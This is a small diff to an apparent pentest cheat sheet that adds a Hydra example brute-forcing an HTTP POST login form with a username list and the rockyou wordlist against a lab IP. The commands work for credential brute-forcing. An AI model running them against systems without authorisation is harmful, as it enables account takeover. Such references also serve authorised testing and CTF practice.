@@ -16,6 +16,13 @@ hydra -l user -P passwords.txt 192.168.100.1 ftp
 hydra -l <username> -P <wordlist> <ip_addr> http-post-form "<path>:<login_credentials>:<invalid_response>" -v
 -v #verbose
 ```
+```
+Example
+```
+hydra -L usernames.txt -P rockyou.txt 10.10.11.22 http-post-form \
+"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
+```
+```
 
 ### HTTP GET Form
 ```
